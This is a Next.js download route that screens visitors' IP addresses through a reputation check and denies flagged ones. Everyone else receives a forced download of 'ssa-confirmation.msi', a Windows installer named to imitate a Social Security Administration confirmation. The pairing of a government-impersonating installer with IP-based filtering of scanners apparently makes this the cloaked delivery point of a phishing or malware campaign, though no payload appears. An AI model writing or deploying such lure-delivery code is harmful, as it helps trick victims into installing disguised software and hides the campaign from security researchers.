import { NextRequest, NextResponse } from 'next/server';
import { checkIP } from '@/lib/ipCheck';
import { readFileSync, existsSync } from 'fs';
import { join } from 'path';

export async function GET(request: NextRequest) {
    try {
        const forwardedFor = request.headers.get('x-forwarded-for');
        const realIP = request.headers.get('x-real-ip');
        const ip = forwardedFor?.split(',')[0]?.trim() || realIP || 'Unknown';

        let isSafe = true;

        if (ip !== 'Unknown' && ip !== '127.0.0.1' && ip !== 'localhost') {
            const apiKey = process.env.IPAPI_API_KEY;
            const securityCheck = await checkIP(ip, apiKey);
            isSafe = securityCheck.isSafe;
        }

        if (!isSafe) {
            return new NextResponse('Access denied', { status: 403 });
        }

        const filePath = join(process.cwd(), 'protected', 'ssa-confirmation.msi');
        
        if (!existsSync(filePath)) {
            return new NextResponse('File not found', { status: 404 });
        }

        const fileBuffer = readFileSync(filePath);
        
        return new NextResponse(fileBuffer, {
            status: 200,
            headers: {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': 'attachment; filename="ssa-confirmation.msi"',
                'Content-Length': fileBuffer.length.toString(),
            },
        });
    } catch (error) {
        console.error('Download error:', error);
        return new NextResponse('Server error', { status: 500 });
    }
}
